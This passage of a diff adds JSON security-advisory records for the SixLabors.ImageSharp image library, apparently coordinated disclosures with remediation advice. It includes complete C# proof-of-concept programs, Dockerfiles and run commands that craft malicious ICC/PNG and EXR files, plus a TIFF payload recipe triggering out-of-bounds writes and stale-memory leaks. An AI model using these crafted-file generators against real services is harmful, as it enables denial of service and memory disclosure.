stream.Write(Encoding.ASCII.GetBytes(\"mft2\"));\n        U32(stream, 0);\n        stream.WriteByte(inCh);\n        stream.WriteByte((byte)outCh);\n        stream.WriteByte(clutPoints);\n        stream.WriteByte(0);\n        for (int y = 0; y < 3; y++)\n        {\n            for (int x = 0; x < 3; x++) Fixed16(stream, x == y ? 1D : 0D);\n        }\n\n        U16(stream, tableEntries);\n        U16(stream, tableEntries);\n        for (int channel = 0; channel < inCh; channel++)\n        {\n            U16(stream, 0); U16(stream, ushort.MaxValue);\n        }\n\n        for (int point = 0; point < 8; point++)\n        {\n            for (int channel = 0; channel < outCh; channel++) U16(stream, 0x8000);\n        }\n\n        for (int channel = 0; channel < outCh; channel++)\n        {\n            U16(stream, 0); U16(stream, ushort.MaxValue);\n        }\n\n        long tagEnd = stream.Position;\n        byte[] result = stream.ToArray();\n        BinaryPrimitives.WriteUInt32BigEndian(result.AsSpan((int)offsetField), (uint)tagStart);\n        BinaryPrimitives.WriteUInt32BigEndian(result.AsSpan((int)sizeField), (uint)(tagEnd - tagStart));\n        BinaryPrimitives.WriteUInt32BigEndian(result, (uint)result.Length);\n        return result;\n    }\n\n    private static byte[] BuildPng(byte[] icc)\n    {\n        using var source = new Image<Rgb24>(16, 16);\n        source.Metadata.IccProfile = new IccProfile(icc);\n        using var encoded = new MemoryStream();\n        source.SaveAsPng(encoded);\n        return encoded.ToArray();\n    }\n\n    public static int Main(string[] args)\n    {\n        string mode = args.Length == 1 ? args[0] : \"exploit\";\n        if (mode is not (\"exploit\" or \"control\")) throw new ArgumentException(\"mode must be exploit or control\");\n        int outputChannels = mode == \"exploit\" ? 15 : 3;\n        Console.WriteLine($\"mode={mode} output_channels={outputChannels}\");\n        Console.WriteLine($\"imagesharp_assembly={typeof(Image).Assembly.Location}\");\n        Console.WriteLine($\"imagesharp_version={typeof(Image).Assembly.GetCustomAttribute<AssemblyInformationalVersionAttribute>()?.InformationalVersion}\");\n        byte[] png = BuildPng(BuildIcc(outputChannels));\n        Console.WriteLine($\"png_bytes={png.Length}\");\n        var options = new DecoderOptions { ColorProfileHandling = ColorProfileHandling.Convert };\n        using Image image = Image.Load(options, png);\n        Console.WriteLine(\"decode_completed\");\n        return 0;\n    }\n}\n\n```\n\nProject file:\n\n```xml\n<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>net8.0</TargetFramework>\n    <ImplicitUsings>disable</ImplicitUsings>\n    <Nullable>enable</Nullable>\n  </PropertyGroup>\n  <ItemGroup>\n    <Reference Include=\"SixLabors.ImageSharp\">\n      <HintPath>/root/.nuget/packages/sixlabors.imagesharp/4.1.1/lib/net8.0/SixLabors.ImageSharp.dll</HintPath>\n      <Private>true</Private>\n    </Reference>\n    <Reference Include=\"System.IO.Hashing\">\n      <HintPath>/root/.nuget/packages/system.io.hashing/8.0.0/lib/net8.0/System.IO.Hashing.dll</HintPath>\n      <Private>true</Private>\n    </Reference>\n  </ItemGroup>\n</Project>\n\n```\n\nDockerfile:\n\n```dockerfile\nFROM mcr.microsoft.com/dotnet/sdk:8.0\nWORKDIR /work\nCOPY ffp7.csproj Program.cs ./\n# Restore only to obtain the published package. The repro project then uses a\n# direct DLL reference so ImageSharp's package build target is not invoked.\nRUN printf '%s\\n' '<Project Sdk=\"Microsoft.NET.Sdk\"><PropertyGroup><TargetFramework>net8.0</TargetFramework></PropertyGroup><ItemGroup><PackageReference Include=\"SixLabors.ImageSharp\" Version=\"4.1.1\" /></ItemGroup></Project>' > fetch.csproj \\\n    && dotnet restore fetch.csproj --nologo \\\n    && rm fetch.csproj \\\n    && dotnet build ffp7.csproj -c Release --nologo -v quiet\nENTRYPOINT [\"dotnet\", \"/work/bin/Release/net8.0/ffp7.dll\"]\n\n```\n\nRun:\n\n```sh\ndocker build -t imagesharp-ffp7-poc .\ndocker run --rm imagesharp-ffp7-poc control\ndocker run --rm imagesharp-ffp7-poc exploit\n```\n",
+      "ghsa_id": "GHSA-ffp7-56pq-64mr",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-ffp7-56pq-64mr",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-ffp7-56pq-64mr"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106112"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:22:06Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "ICC LUT16 output channel count can write beyond Vector4",
+      "updated_at": "2026-10-06T17:45:25Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-ffp7-56pq-64mr",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, <= 4.1.1"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "MegaManSec",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/2505339?v=4",
+            "events_url": "https://api.github.com/users/MegaManSec/events{/privacy}",
+            "followers_url": "https://api.github.com/users/MegaManSec/followers",
+            "following_url": "https://api.github.com/users/MegaManSec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MegaManSec/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/MegaManSec",
+            "id": 2505339,
+            "login": "MegaManSec",
+            "node_id": "MDQ6VXNlcjI1MDUzMzk=",
+            "organizations_url": "https://api.github.com/users/MegaManSec/orgs",
+            "received_events_url": "https://api.github.com/users/MegaManSec/received_events",
+            "repos_url": "https://api.github.com/users/MegaManSec/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/MegaManSec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MegaManSec/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/MegaManSec",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106111",
+      "cvss": {
+        "score": 5.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 5.9,
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-226"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-226",
+          "name": "Sensitive Information in Resource Not Removed Before Reuse"
+        }
+      ],
+      "description": "## Summary\n\nA crafted ZIP-compressed OpenEXR image can return stale memory from a prior\nImageSharp operation as decoded pixels. The ZIP decoder accepts a non-empty\ninflate result shorter than the EXR block's required size, then the EXR decoder\nreads the full expected block.\n\nThis is a process-local, cross-operation information-disclosure defect. It is\nrelevant when an application uses the shared `Configuration.Default` allocator\nfor separate image operations and exposes pixels or output derived from a later\nattacker-controlled EXR decode. Whether that creates a network attack path\ndepends on the host application.\n\nNo active exploitation is known.\n\n## Affected package and versions\n\n- Package: `SixLabors.ImageSharp` (NuGet)\n- Affected published releases: **4.0.0, 4.1.0, and 4.1.1**\n- Affected range: `>= 4.0.0, <= 4.1.1`\n- Commit `0815358f9202a78bc7f3b83e19282dc3654b500f` corresponds to release **v4.1.1**.\n\nEXR support first appears in v4.0.0. The cross-operation PoC exposes the prior-operation marker on each published 4.x release, while the full-inflate control does not expose it on any of them.\n## Details\n\nFor ZIP/ZIPS EXR compression, [`ExrDecoderCore`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Exr/ExrDecoderCore.cs#L169-L205)\nallocates the expected block buffer without `AllocationOptions.Clean` and later\ninterprets the complete buffer as channel data. [`ZipExrCompression`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Exr/Compression/Decompressors/ZipExrCompression.cs#L25-L38)\naccepts a partial but non-empty inflate result: [`UndoZipCompression`](https://github.com/SixLabors/ImageSharp/blob/0815358f9202a78bc7f3b83e19282dc3654b500f/src/ImageSharp/Formats/Exr/Compression/ExrBaseDecompressor.cs#L45-L75)\nrejects only `totalRead == 0`.\n\nOnly the returned prefix is reconstructed and interleaved into the destination\nblock. The remaining bytes retain allocator contents from a completed prior\noperation. `ExrDecoderCore` then converts those bytes into returned image\npixels.\n\n## Reproduction\n\nThe attached Docker PoC uses the published `SixLabors.ImageSharp` NuGet package\nversion 4.1.1. It first completes a valid 64x1 FLOAT/ZIPS EXR encoding that\ncontains the test value `0.27182817`. It then decodes a separate crafted 256x1\nFLOAT/ZIPS EXR.\n\nThe exploit payload inflates to 8 bytes although the declared image block needs\n1024 bytes. The control payload inflates to all 1024 bytes. The marker is\npresent only in exploit output.\n\n```sh\ndocker build -t imagesharp-4q3p-poc .\ndocker run --rm imagesharp-4q3p-poc exploit\ndocker run --rm imagesharp-4q3p-poc control\n```\n\nTest environment: Docker with `mcr.microsoft.com/dotnet/sdk:8.0`, .NET SDK\n8.0.424 / .NET 8, Debian 12, Linux ARM64.\n\nObserved output:\n\n```text\nimagesharp-assembly=4.0.0.0 informational-version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f\nmode=exploit\nprior-operation=valid-exr-encode-completed bytes=383\nprior-value=0.27182817\nleaked=True first-prior-value-pixel=4\n\nimagesharp-assembly=4.0.0.0 informational-version=4.1.1+0815358f9202a78bc7f3b83e19282dc3654b500f\nmode=control\nprior-operation=valid-exr-encode-completed bytes=383\nprior-value=0.27182817\nleaked=False first-prior-value-pixel=-1\n```\n\n## Suggested remediation\n\nReject ZIP/ZIPS EXR blocks unless the decompressor produces exactly the expected\nuncompressed byte count. Clearing the destination buffer is defense in depth,\nbut exact-length validation is required before parsing any decompressed bytes.\n\n\n### Complete PoC files\n\nProgram.cs:\n\n```csharp\nusing System.Buffers.Binary;\nusing System.Globalization;\nusing System.IO.Compression;\nusing System.Reflection;\nusing System.Text;\nusing SixLabors.ImageSharp;\nusing SixLabors.ImageSharp.Formats;\nusing SixLabors.ImageSharp.Formats.Exr;\nusing SixLabors.ImageSharp.Formats.Exr.Constants;\nusing SixLabors.ImageSharp.PixelFormats;\n\n// This performs two independent completed ImageSharp operations in one process.\n// The first is a valid EXR encoding containing a test value. The second is a\n// malformed EXR decode whose short ZIP result exposes that value from the\n// allocator shared through Configuration.Default.\ninternal static class Program\n{\n    private const int PriorWidth = 64;\n    private const int AttackerWidth = 256;\n    private const float PriorValue = 0.271828182f;\n\n    private static int Main(string[] args)\n    {\n        bool exploit = args.Length == 0 || args[0] == \"exploit\";\n        if (args.Length > 0 && args[0] is not (\"exploit\" or \"control\"))\n        {\n            Console.Error.WriteLine(\"usage: final-4q3p [exploit|control]\");\n            return 2;\n        }\n\n        Assembly imageSharp = typeof(Image).Assembly;\n        string informationalVersion = imageSharp\n            .GetCustomAttribute<AssemblyInformationalVersionAttribute>()?\n            .InformationalVersion\n            ?? \"(missing)\";\n        Console.WriteLine($\"imagesharp-assembly={imageSharp.GetName().Version} informational-version={informationalVersion}\");\n        Console.WriteLine($\"mode={(exploit ? \"exploit\" : \"control\")}\");\n\n        EncodePriorOperation();\n\n        // Both variants declare a 256 x 1 FLOAT/ZIPS image, requiring 1024\n        // uncompressed bytes. The control payload supplies all 1024 bytes.\n        // The exploit payload supplies eight non-empty bytes.\n        byte[] exr = BuildAttackerExr(exploit ? 8 : AttackerWidth * sizeof(float));\n        using Image<RgbaVector> result = Image.Load<RgbaVector>(\n            new DecoderOptions { Configuration = Configuration.Default },\n            new MemoryStream(exr));\n\n        result.DangerousTryGetSinglePixelMemory(out Memory<RgbaVector> memory);\n        int firstLeak = FindPriorValue(memory.Span);\n\n        Console.WriteLine($\"prior-value={PriorValue.ToString(\"R\", CultureInfo.InvariantCulture)}\");\n        Console.WriteLine($\"leaked={firstLeak >= 0} first-prior-value-pixel={firstLeak}\");\n\n        if ((firstLeak >= 0) != exploit)\n        {\n            Console.Error.WriteLine(\"unexpected disclosure result\");\n            return 1;\n        }\n\n        return 0;\n    }\n\n    private static void EncodePriorOperation()\n    {\n        using var previousImage = new Image<RgbaVector>(PriorWidth, 1);\n        for (int x = 0; x < PriorWidth; x++)\n        {\n            previousImage[x, 0] = new RgbaVector(PriorValue, 0.125f, 0.5f, 1f);\n        }\n\n        using var encoded = new MemoryStream();\n        previousImage.Save(encoded, new ExrEncoder\n        {\n            Compression = ExrCompression.Zips,\n            PixelType = ExrPixelType.Float,\n        });\n\n        Console.WriteLine($\"prior-operation=valid-exr-encode-completed bytes={encoded.Length}\");\n    }\n\n    private static int FindPriorValue(ReadOnlySpan<RgbaVector> pixels)\n    {\n        int expectedBits = BitConverter.SingleToInt32Bits(PriorValue);\n        for (int x = 0; x < pixels.Length; x++)\n        {\n            if (BitConverter.SingleToInt32Bits(pixels[x].R) == expectedBits)\n            {\n                return x;\n            }\n        }\n\n        return -1;\n    }\n\n    private static byte[] BuildAttackerExr(int inflatedBytes)\n    {\n        byte[] compressed = ZlibCompress(new byte[inflatedBytes]);\n        using var output = new MemoryStream();\n        using var writer = new BinaryWriter(output);\n\n        writer.Write(new byte[] { 0x76, 0x2F, 0x31, 0x01 }); // OpenEXR magic\n        writer.Write((byte)2);\n        writer.Write(new byte[] { 0, 0, 0 });\n\n        using (var channels = new MemoryStream())\n        using (var channelWriter = new BinaryWriter(channels))\n        {\n            WriteString(channelWriter, \"R\");\n            channelWriter.Write(2); // FLOAT\n            channelWriter.Write((byte)0);\n            channelWriter.Write(new byte[] { 0, 0, 0 });\n            channelWriter.Write(1);\n            channelWriter.Write(1);\n            channelWriter.Write((byte)0);\n            WriteAttribute(writer, \"channels\", \"chlist\", channels.ToArray());\n        }\n\n        WriteAttribute(writer, \"compression\", \"compression\", new byte[] { 2 }); // ZIPS\n        WriteBox(writer, \"dataWindow\");\n        WriteBox(writer, \"displayWindow\");\n        WriteAttribute(writer, \"lineOrder\", \"lineOrder\", new byte[] { 0 });\n\n        byte[] one = new byte[4];\n        BinaryPrimitives.WriteSingleLittleEndian(one, 1F);\n        WriteAttribute(writer, \"pixelAspectRatio\", \"float\", one);\n        WriteAttribute(writer, \"screenWindowCenter\", \"v2f\", new byte[8]);\n        WriteAttribute(writer, \"screenWindowWidth\", \"float\", one);\n        writer.Write((byte)0); // end of header\n\n        long chunkOffset = output.Position + sizeof(ulong);\n        writer.Write((ulong)chunkOffset);\n        writer.Write((uint)0); // scanline\n        writer.Write((uint)compressed.Length);\n        writer.Write(compressed);\n        writer.Flush();\n        return output.ToArray();\n    }\n\n    private static void WriteBox(BinaryWriter writer, string name)\n    {\n        using var value = new MemoryStream();\n        using (var box = new BinaryWriter(value, Encoding.ASCII, leaveOpen: true))\n        {\n            box.Write(0);\n            box.Write(0);\n            box.Write(AttackerWidth - 1);\n            box.Write(0);\n        }\n\n        WriteAttribute(writer, name, \"box2i\", value.ToArray());\n    }\n\n    private static byte[] ZlibCompress(byte[] source)\n    {\n        using var compressed = new MemoryStream();\n        using (var zlib = new ZLibStream(compressed, CompressionLevel.Optimal, leaveOpen: true))\n        {\n            zlib.Write(source, 0, source.Length);\n        }\n\n        return compressed.ToArray();\n    }\n\n    private static void WriteAttribute(BinaryWriter writer, string name, string type, byte[] value)\n    {\n        WriteString(writer, name);\n        WriteString(writer, type);\n        writer.Write(value.Length);\n        writer.Write(value);\n    }\n\n    private static void WriteString(BinaryWriter writer, string value)\n    {\n        writer.Write(Encoding.ASCII.GetBytes(value));\n        writer.Write((byte)0);\n    }\n}\n\n```\n\nProject file:\n\n```xml\n<Project Sdk=\"Microsoft.NET.Sdk\">\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>net8.0</TargetFramework>\n    <Nullable>enable</Nullable>\n    <ImplicitUsings>enable</ImplicitUsings>\n  </PropertyGroup>\n  <ItemGroup>\n    <PackageReference Include=\"SixLabors.ImageSharp\" Version=\"4.1.1\" />\n  </ItemGroup>\n</Project>\n\n```\n\nDockerfile:\n\n```dockerfile\nFROM mcr.microsoft.com/dotnet/sdk:8.0\n\nWORKDIR /poc\nCOPY final-4q3p.csproj Program.cs ./\n\n# Debug is intentional: ImageSharp 4.1.1's package build target reports a\n# missing-license warning rather than an error in this configuration. The\n# program is still compiled against the published 4.1.1 NuGet assembly.\nRUN dotnet restore && dotnet build -c Debug --no-restore\n\nENTRYPOINT [\"dotnet\", \"bin/Debug/net8.0/final-4q3p.dll\"]\n\n```\n\nRun:\n\n```sh\ndocker build -t imagesharp-4q3p-poc .\ndocker run --rm imagesharp-4q3p-poc exploit\ndocker run --rm imagesharp-4q3p-poc control\n```\n",
+      "ghsa_id": "GHSA-4q3p-rj5x-xv7p",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-4q3p-rj5x-xv7p",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-4q3p-rj5x-xv7p"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106111"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-09-15T07:22:12Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/JimBobSquarePants/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/JimBobSquarePants",
+        "user_view_type": "public"
+      },
+      "severity": "medium",
+      "state": "published",
+      "submission": null,
+      "summary": "EXR ZIP decoder can expose stale allocator data after a short inflate",
+      "updated_at": "2026-10-06T17:43:38Z",
+      "url": "https://api.github.com/repos/SixLabors/ImageSharp/security-advisories/GHSA-4q3p-rj5x-xv7p",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "nuget",
+            "name": "SixLabors.ImageSharp"
+          },
+          "patched_versions": "4.1.2",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": ">= 4.0.0, <= 4.1.1"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    {
+      "author": null,
+      "closed_at": null,
+      "collaborating_teams": null,
+      "collaborating_users": null,
+      "comments": 4,
+      "created_at": null,
+      "credits": [
+        {
+          "login": "KimiSecurityTeam",
+          "type": "reporter"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "state": "accepted",
+          "type": "reporter",
+          "user": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/310079311?v=4",
+            "events_url": "https://api.github.com/users/KimiSecurityTeam/events{/privacy}",
+            "followers_url": "https://api.github.com/users/KimiSecurityTeam/followers",
+            "following_url": "https://api.github.com/users/KimiSecurityTeam/following{/other_user}",
+            "gists_url": "https://api.github.com/users/KimiSecurityTeam/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/KimiSecurityTeam",
+            "id": 310079311,
+            "login": "KimiSecurityTeam",
+            "node_id": "U_kgDOEntvTw",
+            "organizations_url": "https://api.github.com/users/KimiSecurityTeam/orgs",
+            "received_events_url": "https://api.github.com/users/KimiSecurityTeam/received_events",
+            "repos_url": "https://api.github.com/users/KimiSecurityTeam/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/KimiSecurityTeam/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/KimiSecurityTeam/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/KimiSecurityTeam",
+            "user_view_type": "public"
+          }
+        }
+      ],
+      "cve_id": "CVE-2026-106117",
+      "cvss": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_severities": {
+        "cvss_v3": {
+          "score": 7.5,
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+        },
+        "cvss_v4": {
+          "score": null,
+          "vector_string": null
+        }
+      },
+      "cwe_ids": [
+        "CWE-787"
+      ],
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        }
+      ],
+      "description": "### Patched versions\n\nFixed in ImageSharp **3.2.0** and **4.1.1**. Users on v3 should upgrade to 3.2.0; users on v4 should upgrade to 4.1.1 or later.\n\n## Summary\r\n\r\nWhen decoding a fax-compressed strip TIFF (Compression=3 / Group 3 1D, or Compression=2 / Modified Huffman), the CCITT decompressors write decoded runs through `BitWriterUtils.WriteBits/WriteBit/WriteZeroBit`, which advance and write bits via `Unsafe.Add` with read-modify-write semantics — **without ever comparing the write position against the target buffer length**. The strip buffer is sized `ImageWidth × RowsPerStrip` (8 bytes in the PoC), but two independent defects let an attacker write tens of millions of bits past it: (a) T4 only increments `rowsWritten` when an EOL code is read, and one `ReadNextRun` accumulates unlimited makeup codes (+2560 px per 12-bit code) into a single `RunLength` that `WritePixelRun` then writes in one shot; (b) Modified Huffman writes **before** validating (`pixelsWritten > Width` is checked at :90-93, after the write at :56-63), so the overflow completes even though an exception is thrown later. One crafted ~90 KB file writes ~19.2 MB linearly past an 8-byte buffer and deterministically kills the process; the write offset and length are fully attacker-controlled (classic heap-corruption primitive on the managed heap).\r\n\r\nVerified at commit `5cd4d0d26a82a9549f297a237aea9cf665bddff8` (main; v4.1.0 was the latest release at the time of verification). A related tiled-path variant (tile-buffer width mismatch) was reported separately as GHSA-v76p-62qx-wwq2 — this report covers the distinct strip-path root cause.\r\n\r\n## Details\r\n\r\nRoot cause: the bit-writing sink has no bounds check, and neither decompressor constrains run lengths against the strip buffer.\r\n\r\n- Unchecked write primitive: [BitWriterUtils.cs#L51](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/BitWriterUtils.cs#L51) (`WriteBit`), :58 (`WriteZeroBit` — also read-modify-write, so even all-white runs really write), :11 (`WriteBits`)\r\n- T4 trigger: [T4TiffCompression.cs#L75](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/Decompressors/T4TiffCompression.cs#L75) and L109-L119 — `rowsWritten` only increments on EOL; consecutive makeup codes accumulate into one `RunLength`, then `WritePixelRun` writes it in full\r\n- MH trigger: [ModifiedHuffmanTiffCompression.cs#L56-L63](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/Compression/Decompressors/ModifiedHuffmanTiffCompression.cs#L56-L63) — write happens before the width check at L90-L93\r\n- Buffer size: [TiffDecoderCore.cs#L932-L967](https://github.com/SixLabors/ImageSharp/blob/5cd4d0d26a82a9549f297a237aea9cf665bddff8/src/ImageSharp/Formats/Tiff/TiffDecoderCore.cs#L932-L967) — `CalculateStripBufferSize` = width × bpp/8 × rowsPerStrip\r\n\r\nAttack surface: `Image.Load(stream)` on an attacker-supplied strip TIFF (`TiffDecoderCore.DecodeStripsChunky` → `TiffDecompressorsFactory.Create` → `Decompress`). Default configuration, no authentication, no user interaction — a plain strip TIFF (far more common than the tiled variant) with Compression=2 or 3 and a chain of CCITT makeup codes.\r\n\r\nRelationship to GHSA-v76p-62qx-wwq2: that report is the **tiled** variant — a caller-side width mismatch (`TiffDecompressorsFactory` drops tile parameters) that overflows with perfectly legal run codes. This report is the **strip** variant — the callee-side missing bounds check plus T4's EOL-only row accounting and MH's write-before-validate. Fixing the caller mismatch does not address this vector; bounding `BitWriterUtils` addresses both (see remediation).\r\n\r\n**Suggested remediation:**\r\n1. Bound `BitWriterUtils.WriteBits/WriteBit/WriteZeroBit` against `buffer.Length*8` (return bool / throw `ImageFormatException`) — do not rely on caller discipline.\r\n2. In the T4/MH decompress loops, validate `(bitsWritten + RunLength) <= buffer.Length*8` **before** writing; abort T4 when accumulated rows exceed stripHeight instead of waiting for the loop to end naturally.\r\n3. In Modified Huffman, move the `pixelsWritten > Width` check before the actual write.\r\n4. Regression fuzz cases: Compression=2/3, EOL-less oversized makeup chains, edge widths; strip and tiled paths share the same constraint.\r\n\r\n## PoC\r\n\r\nFull PoC posted as the first comment below: `Program.cs` (driver), `poc-tiff-t4.tif` + `poc-tiff-mh.tif` (crafted files, ~90 KB each, base64 inline), README.\r\n\r\n1. Build a console project referencing `src/ImageSharp/ImageSharp.csproj`, run it against either crafted file (or call `Image.Load` on it).\r\n2. PoC layout: TIFF (II, 42), ImageWidth=64, ImageLength=1, BitsPerSample=1, Photometric=WhiteIsZero, RowsPerStrip=1; strip data = `EOL(12bit)` + 60000× `white makeup 2560 (000000011111)` + `white terminating code (000111)` — declared run ≈ 153,600,001 px ≈ 19.2 MB into an 8-byte buffer.\r\n3. Observed (both variants):\r\n\r\n   ```\r\n   strip payload 90003 bytes, claimed run ~153,600,001 px = 19,200,000 bytes into 8-byte buffer\r\n   Fatal error. System.AccessViolationException: Attempted to read or write protected memory.\r\n      at SixLabors.ImageSharp.Formats.Tiff.Compression.BitWriterUtils.WriteBits(Span`1<Byte>, IntPtr, IntPtr, Byte)\r\n      at ...ModifiedHuffmanTiffCompression.Decompress(...)\r\n      at SixLabors.ImageSharp.Formats.Tiff.TiffDecoderCore.DecodeStripsChunky[Rgba32](...)\r\n   Aborted (core dumped); exit=134\r\n   ```\r\n\r\n   The T4 variant crashes identically at `T4TiffCompression.WritePixelRun → BitWriterUtils.WriteBits`.\r\n4. Control: an equivalent file without the makeup chain (legal EOL-delimited rows) decodes normally — the crash comes from the oversized runs, not the container.\r\n\r\n## Impact\r\n\r\n- **What it is:** out-of-bounds write (CWE-787). For any service decoding untrusted TIFFs (image hosting/transcoding/thumbnails/CMS): reliable remote DoS (uncatchable fatal process crash), plus a heap OOB write with attacker-controlled offset and length — a realistic heap-corruption / potential code-execution surface. In scope of your SECURITY.md as a library vulnerability.\r\n- **Who is impacted:** applications decoding untrusted TIFF with SixLabors.ImageSharp at the current major (verified on main past v4.1.0); plain strip TIFFs with Compression=2/3 are the trigger, which ordinary TIFF writers can produce.\r\n\r\n---\r\n\r\n---\r\n\r\nReported by **Kimi Security Team** (bug-report@moonshot.ai). We follow coordinated disclosure and have not published any details. Happy to test a patch.",
+      "ghsa_id": "GHSA-jj3q-cwqj-842r",
+      "html_url": "https://github.com/SixLabors/ImageSharp/security/advisories/GHSA-jj3q-cwqj-842r",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-jj3q-cwqj-842r"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2026-106117"
+        }
+      ],
+      "private_fork": null,
+      "published_at": "2026-08-20T09:48:42Z",
+      "publisher": {
+        "avatar_url": "https://avatars.githubusercontent.com/u/385879?v=4",
+        "events_url": "https://api.github.com/users/JimBobSquarePants/events{/privacy}",
+        "followers_url": "https://api.github.com/users/JimBobSquarePants/followers",
+        "following_url": "https://api.github.com/users/JimBobSquarePants/following{/other_user}",
+        "gists_url": "https://api.github.com/users/JimBobSquarePants/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/JimBobSquarePants",
+        "id": 385879,
+        "login": "JimBobSquarePants",
+        "node_id": "MDQ6VXNlcjM4NTg3OQ==",
+        "organizations_url": "https://api.github.com/users/JimBobSquarePants/orgs",
+        "received_events_url": "https://api.github.com/users/JimBobSquarePants/received_events",
+        "repos_url": "https://api.github.com/users/JimBobSquarePants/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/JimBobSquarePants/starred{/owner}{/repo}",
